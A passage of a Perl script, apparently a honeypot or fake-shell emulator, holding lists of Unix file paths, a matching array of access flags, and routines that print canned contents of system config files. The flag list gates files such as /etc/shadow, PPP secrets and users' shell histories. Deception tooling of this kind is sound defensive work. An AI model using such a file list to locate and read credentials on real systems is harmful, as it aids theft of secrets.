"/mnt/w95/cwsdpmi.swp",
"/mnt/w95/deltree.exe",
"/mnt/w95/doskey.com",
"/mnt/w95/edit.com",
"/mnt/w95/ffastun.ffa",
"/mnt/w95/ffastun.ffl",
"/mnt/w95/ffastun.ffo",
"/mnt/w95/ffastun0.ffx",
"/mnt/w95/himem.sys",
"/mnt/w95/initsnd.bat",
"/mnt/w95/io.sys",
"/mnt/w95/logo.sys",
"/mnt/w95/mscdex.exe",
"/mnt/w95/msdos.sys",
"/mnt/w95/msg.txt",
"/mnt/w95/pdoxusrs.net",
"/mnt/w95/scandisk.log",
"/mnt/w95/usdide.sys",
"/proc/cmdline",
"/proc/cpuinfo",
"/proc/devices",
"/proc/dma",
"/proc/fb",
"/proc/filesystems",
"/proc/interrupts",
"/proc/ioports",
"/proc/kcore",
"/proc/kmsg",
"/proc/ksyms",
"/proc/loadavg",
"/proc/locks",
"/proc/mdstat",
"/proc/meminfo",
"/proc/misc",
"/proc/modules",
"/proc/mounts",
"/proc/mtrr",
"/proc/partitions",
"/proc/pci",
"/proc/rtc",
"/proc/slabinfo",
"/proc/sound",
"/proc/stat",
"/proc/swaps",
"/proc/uptime",
"/proc/version",
"/proc/98/cmdline",
"/proc/98/environ",
"/proc/98/maps",
"/proc/98/mem",
"/proc/98/stat",
"/proc/98/statm",
"/proc/98/status",
"/proc/98/fd/0",
"/proc/98/fd/1",
"/proc/98/fd/2",
"/proc/bus/pccard/memory",
"/proc/bus/pci/devices",
"/proc/bus/pci/00/00.0",
"/proc/bus/pci/00/01.0",
"/proc/bus/pci/00/01.1",
"/proc/bus/pci/00/14.0",
"/proc/ide/drivers",
"/proc/net/arp",
"/proc/net/dev",
"/proc/net/dev_mcast",
"/proc/net/dev_stat",
"/proc/net/igmp",
"/proc/net/ip_fwchains",
"/proc/net/ip_fwnames",
"/proc/net/ip_masquerade",
"/proc/net/netlink",
"/proc/net/netstat",
"/proc/net/raw",
"/proc/net/route",
"/proc/net/rt_cache",
"/proc/net/snmp",
"/proc/net/sockstat",
"/proc/net/tcp",
"/proc/net/tr_rif",
"/proc/net/udp",
"/proc/net/unix",
"/proc/net/wireless",
"/proc/scsi/scsi",
"/proc/tty/drivers",
"/proc/tty/ldiscs",
"/root/.ICEauthority",
"/root/.Xauthority",
"/root/.acrorc",
"/root/.addressbook",
"/root/.addressbook.lu",
"/root/.aumixrc",
"/root/.bash_history",
"/root/.blackboxrc",
"/root/.esd_auth",
"/root/.esshshrc",
"/root/.fetchhost",
"/root/.fishingboat",
"/root/.gtkrc",
"/root/.ircservers",
"/root/.kderc",
"/root/.kmid_collections",
"/root/.kss-install.pid.localhost",
"/root/.less",
"/root/.lesskey",
"/root/.lynx_cookies",
"/root/.mh_profile",
"/root/.midnightrc",
"/root/.nessusrc",
"/root/.netwatch.0.9g",
"/root/.newsrc",
"/root/.newsrc-forums.inprise.com",
"/root/.newsrc-news",
"/root/.pine-debug1",
"/root/.pine-debug2",
"/root/.pine-debug3",
"/root/.pine-debug4",
"/root/.pinerc",
"/root/.saves-261-localhost~",
"/root/.screenrc",
"/root/.shad",
"/root/.studio.cfg",
"/root/.tuxracer",
"/root/.watchlog.000",
"/root/.winerc",
"/root/.winerc.bak",
"/root/.winerc.old",
"/root/.workmandb",
"/root/.workmanrc",
"/root/.xinitrc",
"/root/.xpilotrc",
"/root/.xpilotrc.bak",
"/root/.xsession-errors",
"/root/Lynx.trace",
"/root/TODO",
"/root/anarch2.txt",
"/root/anarchy.htm",
"/root/bm.txt",
"/root/bombas",
"/root/haz.jpg",
"/root/hp.tar.gz",
"/root/log",
"/root/lynx_bookmarks.html",
"/root/mbox",
"/root/minicom.log",
"/root/pop3.txt",
"/root/smoke.html",
"/root/smoke2.html",
"/root/smoke3.html",
"/root/suids",
"/root/teste.pl",
"/root/trace",
"/root/txt.txt",
"/root/url",
"/sbin/agetty",
"/sbin/dump_cis",
"/sbin/dumpe2fs",
"/sbin/e2fsck",
"/sbin/e2label",
"/sbin/fdisk",
"/sbin/fsck",
"/sbin/fsck.ext2",
"/sbin/fsck.minix",
"/sbin/ftl_check",
"/sbin/ftl_format",
"/sbin/genksyms",
"/sbin/getty",
"/sbin/halt",
"/sbin/hwclock",
"/sbin/ide_info",
"/sbin/ifconfig",
"/sbin/ifport",
"/sbin/ifuser",
"/sbin/init",
"/sbin/initscript.sample",
"/sbin/insmod",
"/sbin/installpkg",
"/sbin/ipchains",
"/sbin/ipchains-restore",
"/sbin/ipchains-save",
"/sbin/ipfwadm",
"/sbin/ipfwadm-2.3.0",
"/sbin/ipfwadm-wrapper",
"/sbin/isapnp",
"/sbin/jaztool",
"/sbin/kbdrate",
"/sbin/kerneld",
"/sbin/killall5",
"/sbin/ksyms",
"/sbin/ldconfig",
"/sbin/lilo",
"/sbin/liloconfig",
"/sbin/liloconfig.tty",
"/sbin/losetup",
"/sbin/lsmod",
"/sbin/lspci",
"/sbin/makebootdisk",
"/sbin/makepkg",
"/sbin/mkdosfs",
"/sbin/mke2fs",
"/sbin/mkfs",
"/sbin/mkfs.minix",
"/sbin/mklost+found",
"/sbin/mkswap",
"/sbin/modinfo",
"/sbin/modprobe",
"/sbin/netconfig.color",
"/sbin/netconfig.tty",
"/sbin/pack_cis",
"/sbin/pcinitrd",
"/sbin/pkgtool.tty",
"/sbin/plipconfig",
"/sbin/pnpdump",
"/sbin/powerd",
"/sbin/quotacheck",
"/sbin/quotaon",
"/sbin/rarp",
"/sbin/rdev",
"/sbin/removepkg",
"/sbin/request-route",
"/sbin/rmt",
"/sbin/route",
"/sbin/rpc.portmap",
"/sbin/runlevel",
"/sbin/scsi_info",
"/sbin/setpci",
"/sbin/setserial",
"/sbin/setserialbits",
"/sbin/setup.tty",
"/sbin/shutdown",
"/sbin/sln",
"/sbin/sulogin",
"/sbin/swapon",
"/usr/bin/clear",
"/usr/bin/wget",
"/usr/bin/id",
"/usr/bin/who",
"/usr/bin/whoami",
"/usr/bin/score",
"/usr/include/a.out.h",
"/usr/include/aalib.h",
"/usr/include/assert.h",
"/usr/lib/libaa.a",
"/usr/lib/libaa.la",
"/usr/lib/libaa.so.1.0.3",
"/usr/lib/libc.a",
"/usr/lib/libc.so",
"/usr/lib/libc_nonshared.a",
"/usr/lib/libc_p.a",
"/usr/lib/libcrypt.a",
"/usr/lib/libcrypt_p.a",
"/usr/lib/libmpeg.a",
"/usr/lib/libname-server.a",
"/usr/lib/libncur194.a",
"/usr/lib/libncurses.a",
"/usr/lib/libncurses_g.a",
"/usr/lib/libncurses_p.a",
"/usr/lib/libnet.a",
"/usr/lib/libnids.so",
"/usr/man/Makefile",
"/usr/man/whatis",
"/usr/sbin/in.comsat",
"/usr/sbin/in.fingerd",
"/usr/sbin/in.identd",
"/usr/sbin/in.newtelnetd",
"/usr/sbin/in.pop3d",
"/usr/sbin/in.rexecd",
"/usr/sbin/in.rlogind",
"/usr/sbin/in.rshd",
"/usr/sbin/in.talkd",
"/usr/sbin/in.telnetd",
"/usr/sbin/in.telnetsnoopd",
"/usr/sbin/in.tftpd",
"/usr/sbin/in.timed",
"/usr/sbin/in.writed",
"/usr/sbin/inetd",
"/usr/sbin/ipmasqadm",
"/usr/sbin/ipop3d",
"/usr/sbin/klogd",
"/usr/sbin/ppp-go",
"/usr/sbin/ppp-off",
"/usr/sbin/pppd",
"/usr/sbin/pppsetup",
"/usr/sbin/pppstats",
"/usr/sbin/rpc.bootparamd",
"/usr/sbin/rpc.bwnfsd",
"/usr/sbin/rpc.mountd",
"/usr/sbin/rpc.nfsd",
"/usr/sbin/rpc.pcnfsd",
"/usr/sbin/rpc.rusersd",
"/usr/sbin/rpc.rwalld",
"/usr/sbin/rpc.yppasswdd",
"/usr/sbin/rpc.ypxfrd",
"/usr/sbin/sendmail",
"/usr/sbin/syslogd",
"/usr/sbin/tcpd",
"/usr/sbin/tcpdchk",
"/usr/sbin/tcpdmatch",
"/usr/sbin/tickadj",
"/usr/sbin/wu.ftpd",
"/var/lib/apache/ABOUT_APACHE",
"/var/lib/apache/Announcement",
"/var/lib/apache/INSTALL",
"/var/lib/apache/KEYS",
"/var/lib/apache/LICENSE",
"/var/lib/apache/Makefile.tmpl",
"/var/lib/apache/README",
"/var/lib/apache/README.NT",
"/var/lib/apache/README.configure",
"/var/lib/apache/WARNING-NT.TXT",
"/var/lib/apache/configure",
"/misc/ids/ids.o",
"/usr/bin/nslookup",
"/usr/bin/xaos",
"/usr/bin/screen",
"/sbin/rmmod",
"/misc/cnm/signatures"
);


my @catfiles = (
"/etc/DIR_COLORS",
"/etc/HOSTNAME",
"/etc/NETWORKING",
"/etc/XF86Config",
"/etc/aliases",
"/etc/aliases.db",
"/etc/conf.modules",
"/etc/dhcpd.conf",
"/etc/diphosts",
"/etc/exports",
"/etc/fdprm",
"/etc/fstab",
"/etc/ftpaccess",
"/etc/ftpconversions_k",
"/etc/ftpgroups",
"/etc/ftpusers",
"/etc/gateways",
"/etc/gettydefs",
"/etc/gpm-root.conf",
"/etc/gpm-syn.conf",
"/etc/gpm-twiddler.conf",
"/etc/group",
"/etc/host.conf",
"/etc/hosts",
"/etc/hosts.allow",
"/etc/hosts.deny",
"/etc/hosts.equiv",
"/etc/hosts.lpd",
"/etc/inetd.conf",
"/etc/inittab",
"/etc/inputrc",
"/etc/issue",
"/etc/issue.net",
"/etc/ld.so.cache",
"/etc/ld.so.conf",
"/etc/lilo.conf",
"/etc/login.access",
"/etc/login.defs",
"/etc/magic",
"/etc/mail.rc",
"/etc/modules.conf",
"/etc/motd",
"/etc/mtab",
"/etc/named.boot",
"/etc/named.conf",
"/etc/netgroup",
"/etc/networks",
"/etc/organization",
"/etc/papd.conf",
"/etc/passwd",
"/etc/profile",
"/etc/protocols",
"/etc/resolv.conf",
"/etc/rpc",
"/etc/securetty",
"/etc/services",
"/etc/shadow",
"/etc/shells",
"/etc/danOS-version",
"/etc/snooptab",
"/etc/syslog.conf",
"/etc/termcap",
"/etc/wgetrc",
"/etc/default/getty.ttyS1",
"/etc/default/uugetty.ttyS0-sample",
"/etc/default/uugetty.ttyS1",
"/etc/default/uugetty.ttyS1.1",
"/etc/default/uugetty.ttyS1.works",
"/etc/default/uugetty.ttyS1~",
"/etc/default/uugetty.ttyS3.unused",
"/etc/dhcpc/dhcpcd-eth0.exe",
"/etc/httpd/conf/access.conf",
"/etc/httpd/conf/httpd.conf",
"/etc/httpd/conf/magic",
"/etc/httpd/conf/mime.types",
"/etc/httpd/conf/srm.conf",
"/etc/mail/aliases.db",
"/etc/mail/helpfile",
"/etc/mail/sendmail.cf",
"/etc/mail/sendmail.mc",
"/etc/mail/sendmail.st",
"/etc/mail/statistics",
"/etc/pam.d/ssh",
"/etc/ppp/chap-secrets",
"/etc/ppp/ip-down",
"/etc/ppp/ip-up",
"/etc/ppp/options",
"/etc/ppp/options.demand",
"/etc/ppp/pap-secrets",
"/etc/ppp/pppscript",
"/etc/ppp/pppsetup.txt",
"/etc/ppp/peers/wvdial",
"/etc/profile.d/kde.csh",
"/etc/profile.d/kde.sh",
"/etc/profile.d/qt.csh",
"/etc/profile.d/qt.sh",
"/etc/rc.d/rc.4",
"/etc/rc.d/rc.6",
"/etc/rc.d/rc.K",
"/etc/rc.d/rc.M",
"/etc/rc.d/rc.S",
"/etc/rc.d/rc.atalk",
"/etc/rc.d/rc.cdrom",
"/etc/rc.d/rc.font.sample",
"/etc/rc.d/rc.gpm",
"/etc/rc.d/rc.httpd",
"/etc/rc.d/rc.ibcs2",
"/etc/rc.d/rc.inet1",
"/etc/rc.d/rc.inet2",
"/etc/rc.d/rc.local",
"/etc/rc.d/rc.modules",
"/etc/rc.d/rc.pcmcia",
"/etc/rc.d/rc.samba",
"/etc/rc.d/rc.serial",
"/etc/rc.d/rc.sysvinit",
"/etc/rc.d/rc.ids",
"/etc/rc.d/init.d/ippl",
"/etc/rc.d/init.d/postgresql",
"/etc/rc.d/init.d/quake-server",
"/etc/rc.d/init.d/sshd",
"/etc/vga/dvorak-us.keymap",
"/etc/vga/libvga.config",
"/etc/vga/libvga.et4000",
"/etc/vga/libvga.et6000",
"/etc/vga/null.keymap",
"/etc/msgs/mirrors.msg",
"/etc/msgs/msg.dead",
"/etc/msgs/msg.toomany",
"/etc/msgs/welcome.msg",
"/home/ftp/tmp/p00r.c",
"/home/joao/.bash_history",
"/home/lorena/.bash_history",
"/home/lorena/recado.txt",
"/home/daniel/.bash_history",
"/home/bill/mail/sent-mail",
"/proc/cmdline",
"/proc/cpuinfo",
"/proc/devices",
"/proc/dma",
"/proc/fb",
"/proc/filesystems",
"/proc/interrupts",
"/proc/ioports",
"/proc/loadavg",
"/proc/locks",
"/proc/mdstat",
"/proc/meminfo",
"/proc/misc",
"/proc/modules",
"/proc/mounts",
"/proc/mtrr",
"/proc/partitions",
"/proc/sound",
"/proc/stat",
"/proc/swaps",
"/proc/uptime",
"/proc/version",
"/proc/98/cmdline",
"/proc/98/environ",
"/proc/98/maps",
"/proc/98/mem",
"/proc/98/stat",
"/proc/98/statm",
"/proc/98/status",
"/proc/bus/pccard/memory",
"/proc/bus/pci/devices",
"/proc/bus/pci/00/00.0",
"/proc/bus/pci/00/01.0",
"/proc/bus/pci/00/01.1",
"/proc/bus/pci/00/14.0",
"/proc/ide/drivers",
"/proc/net/arp",
"/proc/net/dev",
"/proc/net/dev_mcast",
"/proc/net/dev_stat",
"/proc/net/igmp",
"/proc/net/ip_fwchains",
"/proc/net/ip_fwnames",
"/proc/net/ip_masquerade",
"/proc/net/netlink",
"/proc/net/netstat",
"/proc/net/raw",
"/proc/net/route",
"/proc/net/rt_cache",
"/proc/net/snmp",
"/proc/net/sockstat",
"/proc/net/tcp",
"/proc/net/tr_rif",
"/proc/net/udp",
"/proc/net/unix",
"/proc/net/wireless",
"/proc/scsi/scsi",
"/proc/tty/drivers",
"/proc/tty/ldiscs",
"/root/.ICEauthority",
"/root/.Xauthority",
"/root/.acrorc",
"/root/.addressbook",
"/root/.addressbook.lu",
"/root/.aumixrc",
"/root/.bash_history",
"/root/.blackboxrc",
"/root/.esd_auth",
"/root/.esshshrc",
"/root/.fetchhost",
"/root/.fishingboat",
"/root/.gtkrc",
"/root/.ircservers",
"/root/.kderc",
"/root/.kmid_collections",
"/root/.kss-install.pid.localhost",
"/root/.less",
"/root/.lesskey",
"/root/.lynx_cookies",
"/root/.mh_profile",
"/root/.midnightrc",
"/root/.nessusrc",
"/root/.netwatch.0.9g",
"/root/.newsrc",
"/root/.newsrc-forums.inprise.com",
"/root/.newsrc-news",
"/root/.pine-debug1",
"/root/.pine-debug2",
"/root/.pine-debug3",
"/root/.pine-debug4",
"/root/.pinerc",
"/root/.saves-261-localhost~",
"/root/.screenrc",
"/root/.shad",
"/root/.studio.cfg",
"/root/.tuxracer",
"/root/.watchlog.000",
"/root/.winerc",
"/root/.winerc.bak",
"/root/.winerc.old",
"/root/.workmandb",
"/root/.workmanrc",
"/root/.xinitrc",
"/root/.xpilotrc",
"/root/.xpilotrc.bak",
"/root/.xsession-errors",
"/root/Lynx.trace",
"/root/TODO",
"/root/anarch2.txt",
"/root/anarchy.htm",
"/root/bm.txt",
"/root/bombas",
"/root/log",
"/root/lynx_bookmarks.html",
"/root/mbox",
"/root/minicom.log",
"/root/pop3.txt",
"/root/smoke.html",
"/root/smoke2.html",
"/root/smoke3.html",
"/root/suids",
"/root/teste.pl",
"/root/trace",
"/root/txt.txt",
"/root/url",
"/usr/include/a.out.h",
"/usr/include/aalib.h",
"/usr/include/assert.h",
"/usr/man/Makefile",
"/usr/man/whatis",
"/var/lib/apache/ABOUT_APACHE",
"/var/lib/apache/Announcement",
"/var/lib/apache/INSTALL",
"/var/lib/apache/KEYS",
"/var/lib/apache/LICENSE",
"/var/lib/apache/Makefile.tmpl",
"/var/lib/apache/README",
"/var/lib/apache/README.NT",
"/var/lib/apache/README.configure",
"/var/lib/apache/WARNING-NT.TXT",
"/var/lib/apache/configure",
"/misc/cnm/signatures"
);

my @catfiles_acesso = (
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"1",
"1",
"1",
"0",
"0",
"0",
"1",
"1",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"0",
"1",
"1",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"1",
"0",
"1",
"1",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"1",
"1",
"0",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"1",
"1",
"1",
"0",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"0",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"1",
"1",
"1",
"1",
"1",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0",
"0"
);


sub cat_0
{
   # /etc/DIR_COLORS
   print STDERR << "EOT"
# Configuration file for the color ls utility
# This file goes in the /etc directory, and must be world readable.
# You can copy this file to .dir_colors in your \$HOME directory to override
# the system defaults.

# COLOR needs one of these arguments: 'tty' colorizes output to ttys, but not
# pipes. 'all' adds color characters to all output. 'none' shuts colorization
# off.
COLOR tty

# Extra command line options for ls go here.
# Basically these ones are:
#  -F = show '/' for dirs, '*' for executables, etc.
#  -T 0 = don't trust tab spacing when formatting ls output.
#  -b = better support for special characters
OPTIONS -F -b -T 0

# Below, there should be one TERM entry for each termtype that is colorizable
TERM danos
TERM console
TERM con132x25
TERM con132x30
TERM con132x43
TERM con132x60
TERM con80x25
TERM con80x28
TERM con80x30
TERM con80x43
TERM con80x50
TERM con80x60
EOT
}

sub cat_1
{
   # /etc/HOSTNAME
   print STDERR << "EOT"
localhost
EOT
}

sub cat_2
{
   # /etc/NETWORKING
   print STDERR << "EOT"
YES
EOT
}

sub cat_3
{
   # /etc/XF86Config
   print STDERR << "EOT"
# File generated by xf86config.

#
# Copyright (c) 1995 by The XFree86 Project, Inc.
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
# THE XFREE86 PROJECT BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF
# OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# 
# Except as contained in this notice, the name of the XFree86 Project shall
# not be used in advertising or otherwise to promote the sale, use or other
# dealings in this Software without prior written authorization from the
# XFree86 Project.
#

# **********************************************************************
EOT
}

sub cat_4
{
   # /etc/aliases
   print STDERR << "EOT"
#
#	\@(#)aliases	8.2 (Berkeley) 3/5/94
#
#  Aliases in this file will NOT be expanded in the header from
#  Mail, but WILL be visible over networks or from /bin/mail.
#
#	>>>>>>>>>>	The program "newaliases" must be run after
#	>> NOTE >>	this file is updated for any changes to
#	>>>>>>>>>>	show through to sendmail.
#

# Basic system aliases -- these MUST be present.
MAILER-DAEMON:	postmaster
postmaster:	root

# General redirections for pseudo accounts.
bin:		root
daemon:		root
games:		root
ingres:		root
nobody:		root
system:		root
toor:		root
uucp:		root

# Well-known aliases.
manager:	root
dumper:		root
webmaster:      root
abuse:		root
EOT
}

sub cat_5
{
   # /etc/aliases.db
   print STDERR << "EOT"
            a                               эh^                                                                                                                                     `�      7�c�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 � ����������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               \@ \@ root webmaster root toor root daemon root postmaster                     � ��������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   root dumper root uucp root system root bin                     � ������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 root decode root abuse root ingres                     � ��������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 root manager root nobody root games postmaster mailer-daemon 
EOT
}

sub cat_6
{
   # /etc/conf.modules
   print STDERR << "EOT"
alias sound sb
alias midi mpu401
options mpu401 io=0x330 irq=9
options sb io=0x220 irq=5 dma=1 dma16=5
EOT
}

sub cat_7
{
   # /etc/dhcpd.conf
   print STDERR << "EOT"
# dhcpd.conf
#
# Configuration file for ISC dhcpd (see 'man dhcpd.conf')
#
EOT
}

sub cat_8
{
   # /etc/diphosts
   print STDERR << "EOT"
#
# diphosts	This file describes a number of name-to-address
#		mappings for the DIP program.  It is used to determine
#		which host IP address to use for an incoming call of
#		some user.
#
# Version:	\@(#)diphosts		1.20	05/31/94
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org>
# Modified:     Uri Blumenthal      <uri\@watson.ibm.com>
#
# name : pwd : hostname : local server: netmask: comments : protocol,mtu
#==================================================
#sbonjovi::bonjovi:server1:netmask:MicroWalt "bonjovi" SLIP:SLIP,296
#sroxette::roxette:server2:netmask:MicroWalt "roxette" SLIP:CSLIP,296
#stephen:s/key:tuin:server3:netmask:S/Key Authenticated login:CSLIP,296

# End of diphosts.
EOT
}

sub cat_9
{
   # /etc/exports
   print STDERR << "EOT"
# See exports(5) for a description.
# This file contains a list of all directories exported to other computers.
# It is used by rpc.nfsd and rpc.mountd.
EOT
}

sub cat_10
{
   # /etc/fdprm
   print STDERR << "EOT"
# /etc/fdprm  -  floppy disk parameter table

# Common disk formats. Names are of the form
#  actual media capacity/maximum drive capacity
# (Note: although 5.25" HD drives can format disks at 1.44M, they're listed
#        as 1200 because that's the common maximum size.)

#		size sec/t hds trk stre gap  rate spec1 fmt_gap
360/360		 720     9   2  40    0 0x2A 0x02 0xDF     0x50
1200/1200	2400    15   2  80    0 0x1B 0x00 0xDF     0x54
360/720		 720     9   2  40    1 0x2A 0x02 0xDF     0x50
720/720		1440     9   2  80    0 0x2A 0x02 0xDF     0x50
720/1440	1440     9   2  80    0 0x2A 0x02 0xDF     0x50
360/1200	 720     9   2  40    1 0x23 0x01 0xDF     0x50
720/1200	1440     9   2  80    0 0x23 0x01 0xDF     0x50
1440/1440	2880    18   2  80    0 0x1B 0x00 0xCF     0x6C

# Non-standard disk formats:

# BEWARE: They're incomplete and possibly incorrect. The only reason why
#         they are in this file is to show how such formats are added.

1440/1200	2880	18   2  80    0 ???? ???? ????	   ???? # ?????
1680/1440	3360	21   2  80    0 0x0C 0x00 0xCF     0x6C # ?????

# Add user-specific formats here
EOT
}

sub cat_11
{
   # /etc/fstab
   print STDERR << "EOT"
/dev/hda6      swap           swap        defaults   0   0
/dev/hda5      /              ext2        defaults   1   1
/dev/hda1      /mnt/w95       vfat        defaults   1   0
/dev/cdrom     /mnt/cdrom     iso9660     defaults   1   0
/dev/fd0       /mnt/fw95      vfat        defaults   1   0
none           /dev/pts       devpts      gid=5,mode=620  0   0
none           /proc          proc        defaults   0   0
EOT
}

sub cat_12
{
   # /etc/ftpaccess
   print STDERR << "EOT"
loginfails 2

class   local   real,guest,anonymous *.domain 0.0.0.0
class   remote  real,guest,anonymous *

limit   local   20  Any                 /etc/msgs/msg.toomany
limit   remote  100 SaSu|Any1800-0600   /etc/msgs/msg.toomany
limit   remote  60  Any                 /etc/msgs/msg.toomany

readme  README*    login
readme  README*    cwd=*

message /welcome.msg            login
message .message                cwd=*

compress        yes             local remote
tar             yes             local remote

# allow use of private file for SITE GROUP and SITE GPASS?
private         yes

# passwd-check  <none|trivial|rfc822>  [<enforce|warn>]
passwd-check    rfc822  warn

log commands real
log transfers anonymous,real inbound,outbound
shutdown /etc/shutmsg

# all the following default to "yes" for everybody
delete          no      guest,anonymous         # delete permission?
EOT
}

sub cat_13
{
   # /etc/ftpconversions_k
   print STDERR << "EOT"
 :.Z:  :  :/bin/compress -d -c %s:T_REG|T_ASCII:O_UNCOMPRESS:UNCOMPRESS
 :   : :.Z:/bin/compress -c %s:T_REG:O_COMPRESS:COMPRESS
 :.gz: :  :/bin/gzip -cd %s:T_REG|T_ASCII:O_UNCOMPRESS:GUNZIP
 :   : :.gz:/bin/gzip -9c %s:T_REG:O_COMPRESS:GZIP
 :   : :.tar:/bin/tar -cf - %s:T_REG|T_DIR:O_TAR:TAR
 :   : :.tar.gz:/bin/tar -czf - %s:T_REG|T_DIR:O_COMPRESS|O_TAR:TAR+GZIP
EOT
}

sub cat_14
{
   # /etc/ftpgroups
   print STDERR << "EOT"
# /etc/ftpgroups
EOT
}

sub cat_15
{
   # /etc/ftpusers
   print STDERR << "EOT"
#
# ftpusers	This file describes the names of the users that may
#		_*NOT*_ log into the system via the FTP server.
#		This usually includes "root", "uucp", "news" and the
#		like, because those users have too much power to be
#		allowed to do "just" FTP...
#
# Version:	\@(#)/etc/ftpusers	2.00	04/30/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org
#
# The entire line gets matched, so no comments or extra characters on
# lines containing a username.
#

uucp
news

# End of ftpusers.
sara
EOT
}

sub cat_16
{
   # /etc/gateways
   print STDERR << "EOT"
# FvK's uncommented example :^)
#
# net	microwalt	gateway	metallica	passive
EOT
}

sub cat_17
{
   # /etc/gettydefs
   print STDERR << "EOT"
# [ put this file in /etc/gettydefs ]
#
# This file contains the startup and final flags for the
# tty lines.  Each line starts with a SPEED value; this is
# the same SPEED that you pass to [uu]getty.  Note that the
# SPEED identifier is just a string; use whatever names
# you want.
#
# The blank lines in this file are important (so I hear).
#
# The flags are the same flags you would pass to the stty
# program.
#
# Format: <speed># <init flags> # <final flags> #<login string>#<next-speed>
#
#
# Virtual Console entry
VC# B9600 SANE CLOCAL # B9600 SANE -ISTRIP CLOCAL #\@S login: #VC

# 38400 fixed baud Dumb Terminal entry
